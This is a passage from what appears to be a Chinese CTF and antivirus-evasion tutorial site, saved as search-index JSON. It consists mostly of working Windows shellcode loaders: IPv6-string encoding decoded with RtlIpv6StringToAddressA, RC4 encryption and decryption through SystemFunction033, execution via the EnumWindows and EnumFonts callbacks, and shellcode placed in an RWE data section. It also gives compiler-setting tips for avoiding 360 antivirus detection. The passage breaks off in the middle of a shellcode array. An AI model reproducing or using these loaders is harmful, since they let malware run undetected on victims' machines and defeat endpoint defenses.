        }\n            ptr += 4;\n        }\n        VirtualProtect(alloc_mem, sizeof(buf), PAGE_EXECUTE, &amp;pflOldProtect);\n        EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n        return 0;\n    }\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#94-ipv6","title":"9.4 ipv6","text":"<p>shellcode\u8f6c\u6210ipv6</p> <pre><code>import ctypes\n\ndef main():\n    buf = b\"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00\";\n\n    p = 0\n    ip_str_list = []\n\n    while p &lt; len(buf):\n        byte_chunk = buf[p:p+16]\n        ip_str = convert_to_ipv6(byte_chunk)\n        ip_str_list.append(ip_str)\n        p += 16\n\n    print(\"const char* buf[] = {\" + \", \".join(f'\"{ip_str}\"' for ip_str in ip_str_list) + \"};\")\n\ndef convert_to_ipv6(byte_chunk):\n    ip_str = ctypes.create_string_buffer(46)  # IPv6 \u5730\u5740\u5b57\u7b26\u4e32\u7684\u6700\u5927\u957f\u5ea6\u4e3a 46\n    ctypes.windll.ntdll.RtlIpv6AddressToStringA(byte_chunk, ctypes.byref(ip_str))\n    return ip_str.value.decode('utf-8')\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>python3\u8fd0\u884c</p> <p></p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;ip2string.h&gt;\n#include &lt;iostream&gt;\n#pragma comment(lib, \"ntdll.lib\")\n#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) &gt;= 0)\nusing namespace std;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\nint main() {\n  const char* buf[] = { \"fc48:83e4:f0e8:c000:0:4151:4150:5251\", \"5648:31d2:6548:8b52:6048:8b52:1848:8b52\", \"2048:8b72:5048:fb7:4a4a:4d31:c948:31c0\", \"ac3c:617c:22c:2041:c1c9:d41:1c1:e2ed\", \"5241:5148:8b52:208b:423c:4801:d08b:8088\", \"0:48:85c0:7467:4801:d050:8b48:1844\", \"8b40:2049:1d0:e356:48ff:c941:8b34:8848\", \"1d6:4d31:c948:31c0:ac41:c1c9:d41:1c1\", \"38e0:75f1:4c03:4c24:845:39d1:75d8:5844\", \"8b40:2449:1d0:6641:8b0c:4844:8b40:1c49\", \"1d0:418b:488:4801:d041:5841:585e:595a\", \"4158:4159:415a:4883:ec20:4152:ffe0:5841\", \"595a:488b:12e9:57ff:ffff:5d48:ba01:0\", \"::48:8d8d:101:0:41ba:318b\", \"6f87:ffd5:bbf0:b5a2:5641:baa6:95bd:9dff\", \"d548:83c4:283c:67c:a80:fbe0:7505:bb47\", \"1372:6f6a:59:4189:daff:d563:616c:632e\", \"6578:6500::\" };\n  PCSTR lTerminator = NULL;\n  DWORD pflOldProtect = 0;\n  LPVOID alloc_mem = VirtualAlloc(NULL, sizeof(buf) * 16, MEM_COMMIT,\n    PAGE_READWRITE);\n  DWORD_PTR ptr = (DWORD_PTR)alloc_mem;\n  int init = sizeof(buf) / sizeof(buf[0]);\n  for (int i = 0; i &lt; init; i++) {\n    RPC_STATUS STATUS = RtlIpv6StringToAddressA((PCSTR)buf[i], &amp;lTerminator,\n      (in6_addr*)ptr);\n    if (!NT_SUCCESS(STATUS)) {\n      printf(\"[!] RtlIpv6StringToAddressA failed in %s result %x (%u)\", buf[i], STATUS,\n        GetLastError());\n      return FALSE;\n    }\n    ptr += 16;\n  }\n  VirtualProtect(alloc_mem, sizeof(buf) * 16, PAGE_EXECUTE, &amp;pflOldProtect);\n  EnumWindows((WNDENUMPROC)alloc_mem, NULL);\n  return 0;\n}\n</code></pre> <p>RtlIpv6StringToAddressA \u5c06 IPv6 \u5730\u5740\u5b57\u7b26\u4e32\u7684\u4e8c\u8fdb\u5236\u683c\u5f0f\u76f4\u63a5\u5b58\u50a8\u5230\u6307\u9488\u6307\u5411\u7684\u5185\u5b58\u4f4d\u7f6e</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#94rc4","title":"9.4rc4\u52a0\u5bc6","text":""},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_7","title":"\u52a0\u5bc6","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;stdio.h&gt;\ntypedef NTSTATUS(WINAPI* _SystemFunction033)(\n struct ustring *memoryRegion,\n struct ustring *keyPointer);\nstruct ustring {\n DWORD Length;\n DWORD MaximumLength;\n PUCHAR Buffer;\n} _data, key;\nint main() {\n printf(\"[*] RC4 Shellcode Encrypter using Systemfunction032/033\\n\");\n puts(\"[*] Coded by: @OsandaMalith - www.osandamalith.com\");\n _SystemFunction033 SystemFunction033 =\n(_SystemFunction033)GetProcAddress(LoadLibrary(L\"advapi32\"), \"SystemFunction033\");\n // \u52a0\u5bc6\u7684key\n char _key[] = \"www.osandamalith.com\";\n // rc4\u52a0\u5bc6\u9047\u5230\\x00\u4f1a\u505c\u6b62, \u6240\u4ee5\u8f6c\u6210 0x00\u5f62\u5f0f, \u5bf9\u5e94cs\u662fc#\n unsigned char shellcode[] = {\n  0x6A, 0x60, 0x5A, 0x68, 0x63, 0x61, 0x6C, 0x63, 0x54, 0x59, 0x48, 0x29, 0xD4, 0x65, 0x48\n };\n key.Buffer = (PUCHAR)(&amp;_key);\n key.Length = sizeof key;\n _data.Buffer = (PUCHAR)shellcode;\n _data.Length = sizeof shellcode;\n SystemFunction033(&amp;_data, &amp;key);\n printf(\"\\nunsigned char shellcode[] = { \");\n for (size_t i = 0; i &lt; _data.Length; i++) {\n  if (!(i % 16)) printf(\"\\n \");\n  printf(\"0x%02x, \", _data.Buffer[i]);\n  if(i == _data.Length-1) printf(\"0x%02x };\", _data.Buffer[i]);\n }\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article5/index.html#_8","title":"\u89e3\u5bc6\u8fd0\u884c","text":"<pre><code>#include &lt;windows.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\") // \u4e0d\u663e\u793a\u9ed1\u7a97\n\n/*\n* RC4 Shellcode Decrypter using Systemfunction032/033\n* Coded by: @OsandaMalith - www.osandamalith.com\n*/\ntypedef NTSTATUS(WINAPI* _SystemFunction033)(\n struct ustring *memoryRegion,\n struct ustring *keyPointer);\nstruct ustring {\n DWORD Length;\n DWORD MaximumLength;\n PUCHAR Buffer;\n} _data, key;\nint main() {\n _SystemFunction033 SystemFunction033 =\n(_SystemFunction033)GetProcAddress(LoadLibrary(L\"advapi32\"), \"SystemFunction033\");\n char _key[] = \"www.osandamalith.com\";\n\n unsigned char shellcode[] = {\n  0x5f, 0xfc, 0xb3, 0x2c, 0x87, 0xd5, 0xc1, 0xe8, 0x2b, 0xac, 0x12, 0x8f, 0x00, 0x5e, 0xef, \n 0xd3,\n  0xd6, 0x3a, 0x04, 0x80, 0x05, 0xa1, 0x43, 0x45, 0x6a, 0xce, 0x2c, 0xf9, 0x58, 0x0f, 0x34, \n 0xdf,\n  0xf8, 0x8b, 0x78, 0x63, 0xb4, 0x7a, 0xba, 0x5d, 0xdf, 0x14, 0x4f, 0x6b, 0xbf, 0xcd, 0x04, \n 0x44,\n  0x53, 0x2f, 0x35, 0x15, 0x75, 0x56, 0x6a, 0xb6, 0xab, 0xd3, 0x7b, 0xcc, 0x03, 0xb6, 0x16, \n 0x4f,\n  0x4b, 0x30, 0x01, 0x57, 0x58, 0xd8, 0xd0, 0x0b, 0x0b, 0xa0, 0xa1, 0x66, 0x98, 0x83, 0x7e, \n 0xdb,\n  0x0d, 0x1a, 0x08, 0x41, 0x62, 0x62 };\n key.Buffer = (PUCHAR)(&amp;_key);\n key.Length = sizeof key;\n _data.Buffer = (PUCHAR)shellcode;\n _data.Length = sizeof shellcode;\n SystemFunction033(&amp;_data, &amp;key);\n DWORD oldProtect = 0;\n BOOL ret = VirtualProtect((LPVOID)shellcode, sizeof shellcode, PAGE_EXECUTE_READWRITE, \n&amp;oldProtect);\n EnumFonts(GetDC(0), (LPCWSTR)0, (FONTENUMPROC)(char*)shellcode, 0);\n}\n</code></pre>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html","title":"1.\u80cc\u666f","text":"<p>\u5f53\u4f60\u7684\u6837\u672c\u505a\u597d\u4e86, shellcode\u5904\u7406\u4e86, \u52a0\u8f7d\u5668\u7684\u4ee3\u7801\u4e5f\u505a\u4e86\u4f18\u5316, \u4f46\u662f\u88ab\u6740\u8f6f\u4e00\u626b\u63cf\u8fd8\u662f\u9759\u6001\u62a5\u6bd2, \u5f88\u6709\u53ef\u80fd\u662f\u56e0\u4e3aexe\u76f8\u5173\u7684\u64cd\u4f5c\u9700\u8981\u8fdb\u884c\u5904\u7406, \u7b2c\u4e00\u4e2a\u5c31\u662f \u7f16\u8bd1\u5668/\u7f16\u8bd1\u53c2\u6570 \u56e0\u4e3a\u6709\u4e9b\u6740\u8f6f\u5b81\u53ef\u9519\u67401000\u4e5f\u4e0d\u8fc7\u4e00\u4e2a, \u6240\u4ee5\u9488\u5bf9\u4e00\u4e9b\u7279\u5b9a\u7684\u7f16\u8bd1\u5668/\u7f16\u8bd1\u53c2\u6570, \u5373\u4f7f\u4f60\u662f\u8f93\u51fa hello world, \u4e5f\u662f\u4f1a\u62a5\u6bd2\u7684, \u6216\u8005\u4f60\u5f53\u524d\u7a0b\u5e8f\u6ca1\u6709\u6570\u5b57\u7b7e\u540d\u5c31\u62a5\u6bd2, \u4ee5\u53ca\u6ca1\u6709\u8be6\u7ec6\u7684\u7248\u672c\u4fe1\u606f\u5c31\u62a5\u6bd2 \u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u63a7\u5236\u53d8\u91cf\u6cd5\u5bf9\u6bd4\u67e5\u6740\u6548\u679c, \u8fdb\u800c\u603b\u7ed3\u51fa\u6765\u6740\u8f6f\u7684\u67e5\u6740\u6001\u5ea6.</p> <p>\u6bd4\u5982\u6211\u4eec\u5e38\u8bf4\u7684360\u67e5\u6740vs\u7f16\u8bd1\u7684hello world</p> <pre><code>#include &lt;iostream&gt;\nint main()\n{\n  std::cout &lt;&lt; \"Hello World!\\n\";\n}\n</code></pre> <p>\u914d\u7f6e\u597d\u7f16\u8bd1\u5c5e\u6027, \u7f16\u8bd1,\u8981\u6ce8\u610f\u9879\u76ee\u7684\u5c5e\u6027\u914d\u7f6e\u3002</p> <p></p> <p></p> <p>360\u67e5\u6740</p> <p></p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#_1","title":"\u63ed\u79d8","text":""},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#_2","title":"\u4fee\u6539","text":"<p>\u518d\u6b21\u7f16\u8bd1, \u67e5\u6740</p> <p></p> <p>1.MT\u9009\u9879\uff1a\u94fe\u63a5lib\u7248\u7684C++\u8fd0\u884c\u5e93\u96c6\u6210\u5230\u7a0b\u5e8f\u4e2d\uff0c\u4e0d\u9700\u8981dll\uff0c\u56e0\u6b64\u7a0b\u5e8f\u4f1a\u53d8\u5927</p> <p>2.MD\u9009\u9879\uff1a\u4f7f\u7528DLL\u7248\u7684C++\u8fd0\u884c\u5e93\uff0c\u8fd9\u6837\u7a0b\u5e8f\u4f53\u79ef\u8f83\u5c0f\uff0c\u4f46\u7f3a\u70b9\u7535\u8111\u4e0a\u6ca1\u6709\u5bf9\u5e94DLL\u65f6\u65e0\u6cd5\u8fd0\u884c</p> <p>\u6240\u4ee5\u5f53\u6211\u4eec\u5236\u4f5c\u6837\u672c\u65f6\uff0c\u4e0d\u9700\u8981\u7528\u5230\u5176\u4ed6DLL\u65f6\uff0c\u6700\u597d\u9009\u62e9MD\u3002</p>"},{"location":"CTF/Antimalware_evasion/AV/Article6/index.html#_3","title":"\u6307\u9488\u8fd0\u884c\u4e0a\u7ebf","text":"<pre><code>#include &lt;windows.h&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\n#pragma data_seg(\"vdata\")\nunsigned char sc[] = {0xe8,0xcc,0x04,0x00,0x00,0x70,0x41,0x85,0x53,0x2c,0xc1,0x71,0x70,0x2b,0xfe,0xb1,0x87,0xd0,0x09,0xbe,0xda,0x00,0x45,0x30,0x34,0x0c,0x45,0x02,0x34,0x0c,0xe2,0xf6,0xeb,0xf3,0x73,0x77,0x77,0x77,0x21,0x46,0x27,0xce,0x8a,0x2c,0x5c,0xbe,0x23,0x05,0x99,0x53,0x13,0xb3,0x93,0x92,0x08,0x2d,0x1d,0x01,0x81,0xc0,0xba,0xa6,0x2e,0x20,0xd4,0x71,0xb6,0x01,0x90,0xff,0x6c,0x82,0xd0,0x60,0x2b,0x88,0x34,0x29,0xd8,0x96,0xb9,0x1d,0x37,0xad,0x22,0x90,0xdb,0x4c,0x86,0xe8,0x7e,0x52,0xe9,0xf6,0xd7,0xe2,0x27,0x9c,0xfe,0x6f,0xde,0x9f,0x1a,0x67,0xde,0xa5,0x0c,0xc2,0xbc,0x74,0xa6,0x07,0xae,0xf9,0x35,0xc4,0x34,0x50,0xc5,0x3d,0xc6,0x96,0x27,0x5f,0xe4,0x08,0x43,0xb7,0x0e,0xf4,0xf5,0xd8,0x17,0xd6,0x04,0x67,0xb5,0x07,0x96,0x0e,0xb9,0x1c,0x96,0x3f,0x62,0x7b,0x44,0x09,0x83,0x80,0xcc,0x55,0x6c,0x2b,0x40,0x71,0xb5,0xcf,0xef,0x5e,0x61,0xad,0xb4,0xbc,0xe6,0xd5,0x15,0xa0,0x89,0x94,0x6f,0x8b,0xe1,0xfb,0x7e,0x9c,0x8b,0x7c,0xe3,0x60,0x9b,0xd9,0x7d,0x20,0x67,0x80,0x67,0xe4,0xbf,0x5a,0xc5,0x79,0x93,0xa1,0x70,0x81,0x9e,0xe4,0x3b,0xb5,0x32,0xec,0xa4,0xe2,0x6d,0x0d,0x25,0x27,0xf0,0x5c,0xa5,0xf0,0x20,0xd2,0xa5,0xcf,0xa9,0x29,0x0f,0x37,0x64,0x24,0xb5,0xf3,0x50,0x7c,0xe2,0x9a,0xa5,0xb7,0xc2,0x0c,0xbf,0xb3,0xcd,0xcd,0x02,0x72,0xff,0xea,0x3d,0xef,0xdb,0x49,0xf3,0x15,0x44,0x48,0x62,0x24,0x08,0x1c,0xfc,0x16,0x20,0xa9,0xa0,0x31,0x5a,0xc8,0x52,0xe6,0x63,0x06,0xf2,0x1d,0xe1,0xe6,0x53,0x40,0xca,0x4c,0x0d,0x50,0xfa,0x71,0xee,0xdf,0xb0,0xd3,0x70,0x20,0xcf,0xc5,0xb2,0x13,0x36,0x3a,0xd9,0xf2,0x69,0x99,0xf9,0xe4,0x1d,0xf0,0xc6,0x68,0x3f,0x02,0xbd,0x39,0xae,0xef,0x05,0xc3,0xc2,0x1e,0x85,0x1d,0x1f,0x9d,0x00,0x79,0xaa,0xcf,0xa3,0xde,0x1f,0xbe,0x4f,0x3c,0x6a,0x68,0x94,0x53,0x4e,0x6a,0xa0,0x22,0x40,0x25,0x62,0x6b,0x44,0xd6,0xf1,0xfe,0xa4,0x2b,0xe6,0x58,0xb4,0x1d,0x44,0xa5,0x84,0x82,0xa4,0x53,0x3c,0x56,0x4f,0x4e,0x1b,0x7c,0xb2,0x6b,0x2e,0xf4,0x01,0x5a,0x79,0xeb,0x4f,0x66,0x6f,0xec,0x25,0x40,0xd2,0x40,0x53,0x28,0x72,0x65,0xac,0x98,0x74,0x26,0x87,0x7b,0x9a,0x7a,0x1a,0x56,0xf0,0x49,0x72,0xfe,0x7e,0x48,0x17,0xa9,0xcc,0xd8,0x50,0x2a,0x47,0x1a,0x69,0x5b,0x02,0xd4,0xe1,0xec,0x1e,0x2d,0x09,0x03,0xd6,0x5d,0xdb,0xd0,0x67,0x89,0xfa,0x9f,0x0b,0x2f,0xb1,0xc8,0xb4,0x25,0xdb,0xaf,0x68,0xb5,0x85,0x54,0x62,0x86,0x4c,0x19,0xee,0xe4,0xdb,0x3b,0x89,0x39,0x4f,0x8a,0xe8,0xcd,0xb3,0xeb,0xea,0xe5,0x52,0xdd,0x49,0x69,0x7c,0xfc,0x22,0xc1,0x88,0x94,0xea,0xf0,0x44,0x67,0x70,0x6b,0xe4,0x8d,0x36,0x06,0xd6,0xa6,0xb1,0x53,0xaf,0xf7,0x46,0x6b,0x0e,0xc1,0x9d,0xc9,0x07,0x31,0x93,0xa2,0x7f,0x28,0x0b,0x88,0xa0,0x58,0x10,0xed,0xf6,0xed,0x2e,0xd8,0xb6,0x99,0x75,0xba,0x34,0xf2,0x38,0xc4,0xcf,0xf3,0x42,0xc3,0x9f,0x53,0xbc,0x57,0xff,0xd1,0x60,0x33,0x83,0x8c,0xe7,0x11,0xe0,0x39,0xe7,0xd2,0x0a,0x93,0x8a,0xb3,0xa3,0x89,0x23,0x96,0x8a,0x94,0xcf,0xf2,0x81,0xf2,0xff,0x65,0x7c,0xbe,0x14,0xb6,0x4a,0xf3,0x2a,0xe9,0x0c,0x52,0x08,0x4f,0xbc,0xc1,0x31,0xd1,0x12,0x25,0x2e,0x43,0x21,0x31,0x20,0x22,0xc5,0x92,0x48,0x9c,0x45,0x0e,0xfd,0x3a,0x1e,0x01,0xb0,0x78,0x0e,0x29,0x8d,0xa4,0x8d,0x1a,0x2f,0x9a,0xcf,0x58,0x21,0x5f,0x15,0x13,0x29,0x4d,0x3c,0x6d,0x68,0xe0,0x6e,0x76,0xa8,0xbc,0xad,0x61,0xd1,0x95,0xef,0xb7,0x18,0xfb,0xc5,0xb8,0x16,0xc7,0xa7,0x9a,0xd5,0x66,0x90,0xe7,0xe7,0x76,0xf9,0xdb,0xbc,0x60,0x33,0xec,0x67,0xf1,0x54,0xf3,0xd0,0xd4,0x88,0x67,0xb2,0x11,0x5b,0x28,0x47,0x24,0x8d,0x62,0x0b,0x98,0xe1,0x41,0x24,0xab,0x01,0x49,0x58,0x38,0x57,0x7f,0x3d,0xef,0xe4,0x45,0xa7,0x2b,0x6d,0x0e,0xe3,0xb1,0x67,0x03,0x13,0xf2,0x12,0x28,0x85,0xb5,0x50,0x3d,0x12,0x98,0xff,0x8c,0x15,0x4e,0x1d,0x36,0x92,0xb1,0x10,0x18,0xb2,0x49,0xe7,0x9f,0xa5,0xe0,0x41,0xc6,0x4d,0xc8,0xbe,0x4c,0x7d,0xad,0x7b,0x35,0x42,0x95,0xbd,0x3c,0xa3,0xe3,0x25,0x1e,0x6a,0xb2,0x98,0xf3,0x4a,0xa7,0xd8,0x75,0x2d,0x61,0x22,0xe2,0x28,0xaf,0xf4,0xb5,0xb2,0x76,0x39,0x28,0x68,0x52,0x2b,0xab,0xb5,0xc6,0x96,0xdb,0x71,0x84,0x78,0x40,0xf8,0xce,0x25,0xea,0x4d,0xb9,0x52,0x80,0x53,0x84,0x27,0xf2,0xfe,0x46,0xca,0x5a,0xc4,0x0a,0xc7,0x9f,0x0e,0x15,0x09,0x1d,0xf5,0x76,0x33,0x5a,0x43,0x48,0x51,0x3d,0x27,0x88,0x19,0x12,0x38,0xb0,0x6f,0x77,0x8f,0x05,0x32,0xc0,0x10,0xe2,0x85,0x03,0xe2,0x1b,0xdd,0xcc,0x6d,0xeb,0x99,0xac,0x9c,0xe7,0xae,0x4b,0x0e,0xc9,0x27,0xf1,0xbf,0x3f,0x90,0x18,0x07,0x3e,0xd6,0xd7,0x0a,0xa9,0x2c,0x32,0x4b,0x15,0xbf,0xef,0xeb,0x6f,0x52,0xe6,0xa0,0x19,0x3e,0x69,0x21,0xdc,0xf5,0x5a,0x1b,0x24,0x1f,0x37,0xda,0xf8,0x56,0x6c,0x62,0x7f,0x5a,0x02,0x3b,0xa5,0x1b,0xd8,0x2d,0x75,0x67,0x5e,0x6a,0xb9,0xd7,0x9b,0x83,0xfa,0x6b,0xa0,0x05,0xba,0x1b,0x7c,0xd3,0x13,0x79,0xc2,0x97,0x78,0x0f,0x0d,0xd0,0xcb,0xda,0x62,0x8d,0xfa,0x00,0x5f,0xc6,0xd7,0xcb,0x2f,0x30,0xf2,0xc0,0x90,0xfe,0xdf,0x99,0x3d,0xf2,0x8d,0x07,0x8b,0xb0,0xf6,0x95,0xb3,0x86,0x07,0x92,0xb6,0x1c,0x4a,0xaa,0x48,0x89,0x62,0x7b,0xda,0xfe,0x06,0x8b,0xd4,0x74,0x77,0x77,0x07,0xf9,0x75,0x33,0xb5,0xee,0x8a,0xa2,0x99,0xa5,0x33,0x7d,0xdb,0x81,0x32,0xaa,0x09,0xc0,0xa0,0x4a,0x5d,0x3d,0x59,0x66,0xc8,0x0e,0xd5,0x20,0x69,0x9d,0xa8,0x41,0xf9,0xd9,0xbd,0xa6,0xec,0xa2,0x2d,0x4c,0x10,0xbf,0xc2,0x64,0xfa,0x3a,0x6a,0x63,0xf2,0x0d,0xf0,0x7e,0x91,0xbb,0x38,0x2e,0x00,0x6c,0xed,0x80,0x3d,0x51,0xfd,0x25,0x72,0x20,0xf0,0xd8,0xa3,0xae,0x70,0xc2,0x63,0x70,0xa6,0x97,0x5b,0x38,0x92,0x7f,0xed,0xb3,0xe7,0x06,0x0c,0x71,0xf6,0x20,0x5f,0xa4,0xdc,0x6b,0x6b,0x8e,0xb3,0xe9,0x11,0x73,0x4f,0x5d,0x7c,0x44,0x8d,0xff,0xaa,0x36,0x13,0x8f,0xd7,0x28,0x24,0x0d,0xef,0xe6,0xb8,0x84,0x44,0xf8,0xaf,0x29,0x66,0xd6,0xa9,0xf0,0xa9,0xcb,0x0e,0x21,0xd5,0x60,0x2d,0x75,0x7a,0x66,0x6b,0xdc,0x52,0x04,0x63,0x5a,0x2c,0x41,0x33,0xcd,0x37,0x3e,0x88,0x95,0x69,0x5b,0x32,0x48,0x47,0x7a,0x48,0xae,0x53,0x19,0x71,0x37,0x68,0x80,0x77,0xc4,0x93,0x02,0x2d,0x16,0x99,0x3c,0x74,0xf9,0xfa,0x10,0x85,0x04,0xe5,0x7f,0x9e,0x33,0x95,0x25,0x38,0x90,0x27,0x25,0x8d,0x43,0xe8,0xd8,0xf6,0xab,0x46,0xa8,0x81,0x3c,0xff,0x3a,0xfa,0xb6,0xcb,0x37,0x68,0xcf,0x32,0xab,0xd8,0x49,0x65,0x2a,0xbe,0xa1,0x16,0xfb,0x42,0xa9,0x61,0x8d,0x52,0x0e,0x34,0xe8,0xc9,0xfc,0xec,0x88,0xf3,0xfe,0x71,0x60,0x44,0x71,0x7b,0xab,0x0a,0x6e,0xbc,0x01,0xe1,0x24,0x5b,0xf3,0x8c,0xb7,0xc6,0xa6,0x09,0xc4,0xbf,0xc7,0x7b,0x5b,0x05,0xe6,0x87,0x5e,0xb2,0x50,0x67,0x21,0xd5,0x3f,0xec,0x33,0xac,0x78,0x49,0xc4,0x3f,0xdd,0xad,0xd3,0x2e,0x3d,0x31,0x4c,0x11,0x59,0xca,0x8e,0x2a,0x5c,0x1f,0xe3,0xeb,0xa8,0x29,0xf9,0xfc,0x90,0x58,0xd9,0x16,0xc7,0x8f,0x63,0xf7,0xb4,0xb5,0xb5,0x3d,0xa4,0x0a,0x50,0x97,0xd4,0x95,0xc5,0xa5,0xb4,0xf5,0x21,0x48,0x8b,0x0c,0x24,0x48,0x83,0xec,0x08,0x81,0x01,0xd1,0x74,0x5d,0xf5,0xc1,0x49,0x04,0x8e,0x81,0x41,0x08,0xd5,0x01,0x9a,0x05,0x81,0x71,0x0c,0xf5,0x00,0xbe,0xda,0x51,0xc3}; // \u6700\u597dsgn\u52a0\u5bc6\u4e00\u4e0b#pragma data_seg()\n#pragma comment(linker,\"/SECTION:vdata,RWE\")\n\nint main() {\n    ((void(*)()) &amp;sc)();}\n</code></pre> <p>\u4f7f\u7528MT\u7f16\u8bd1\uff1a360\u67e5\u6740\uff0c\u76f4\u63a5\u6740</p> <p>\u4f7f\u7528MD\u7f16\u8bd1\uff1a\u4e3a\u4e86\u4fdd\u8bc1\u4ee3\u7801\u5185\u5bb9\u53d1\u9001\u53d8\u5316, \u6211\u4eec\u4ecd\u7136\u52a0\u4e0a\u51e0\u884c\u65e0\u610f\u4e49\u7684\u8f93\u51fa\u4ee3\u7801</p> <pre><code>#include &lt;windows.h&gt;\n#include &lt;iostream&gt;\n#pragma comment(linker,\"/subsystem:\\\"Windows\\\" /entry:\\\"mainCRTStartup\\\"\")\n\n#pragma data_seg(\"vdata\")\nunsigned char sc[] = { 0xe8,0xcc,0x04,0x00,0x00,0x70,0x41,0x85,0x53,0x2c,0xc1,0x71,0x70,0x2b,0xfe,0xb1,0x87,0xd0,0x09,0xbe,0xda,0x00,0x45,0x30,0x34,0x0c,0x45,0x02,0x34,0x0c,0xe2,0xf6,0xeb,0xf3,0x73,0x77,0x77,0x77,0x21,0x46,0x27,0xce,0x8a,0x2c,0x5c,0xbe,0x23,0x05,0x99,0x53,0x13,0xb3,0x93,0x92,0x08,0x2d,0x1d,0x01,0x81,0xc0,0xba,0xa6,0x2e,0x20,0xd4,0x71,0xb6,0x01,0x90,0xff,0x6c,0x82,0xd0,0x60,0x2b,0x88,0x34,0x29,0xd8,0x96,0xb9,0x1d,0x37,0xad,0x22,0x90,0xdb,0x4c,0x86,0xe8,0x7e,0x52,0xe9,0xf6,0xd7,0xe2,0x27,0x9c,0xfe,0x6f,0xde,0x9f,0x1a,0x67,0xde,0xa5,0x0c,0xc2,0xbc,0x74,0xa6,0x07,0xae,0xf9,0x35,0xc4,0x34,0x50,0xc5,0x3d,0xc6,0x96,0x27,0x5f,0xe4,0x08,0x43,0xb7,0x0e,0xf4,0xf5,0xd8,0x17,0xd6,0x04,0x67,0xb5,0x07,0x96,0x0e,0xb9,0x1c,0x96,0x3f,0x62,0x7b,0x44,0x09,0x83,0x80,0xcc,0x55,0x6c,0x2b,0x40,0x71,0xb5,0xcf,0xef,0x5e,0x61,0xad,0xb4,0xbc,0xe6,0xd5,0x15,0xa0,0x89,0x94,0x6f,0x8b,0xe1,0xfb,0x7e,0x9c,0x8b,0x7c,0xe3,0x60,0x9b,0xd9,0x7d,0x20,0x67,0x80,0x67,0xe4,0xbf,0x5a,0xc5,0x79,0x93,0xa1,0x70,0x81,0x9e,0xe4,0x3b,0xb5,0x32,0xec,0xa4,0xe2,0x6d,0x0d,0x25,0x27,0xf0,0x5c,0xa5,0xf0,0x20,0xd2,0xa5,0xcf,0xa9,0x29,0x0f,0x37,0x64,0x24,0xb5,0xf3,0x50,0x7c,0xe2,0x9a,0xa5,0xb7,0xc2,0x0c,0xbf,0xb3,0xcd,0xcd,0x02,0x72,0xff,0xea,0x3d,0xef,0xdb,0x49,0xf3,0x15,0x44,0x48,0x62,0x24,0x08,0x1c,0xfc,0x16,0x20,0xa9,0xa0,0x31,0x5a,0xc8,0x52,0xe6,0x63,0x06,0xf2,0x1d,0xe1,0xe6,0x53,0x40,0xca,0x4c,0x0d,0x50,0xfa,0x71,0xee,0xdf,0xb0,0xd3,0x70,0x20,0xcf,0xc5,0xb2,0x13,0x36,0x3a,0xd9,0xf2,0x69,0x99,0xf9,0xe4,0x1d,0xf0,0xc6,0x68,0x3f,0x02,0xbd,0x39,0xae,0xef,0x05,0xc3,0xc2,0x1e,0x85,0x1d,0x1f,0x9d,0x00,0x79,0xaa,0xcf,0xa3,0xde,0x1f,0xbe,0x4f,0x3c,0x6a,0x68,0x94,0x53,0x4e,0x6a,0xa0,0x22,0x40,0x25,0x62,0x6b,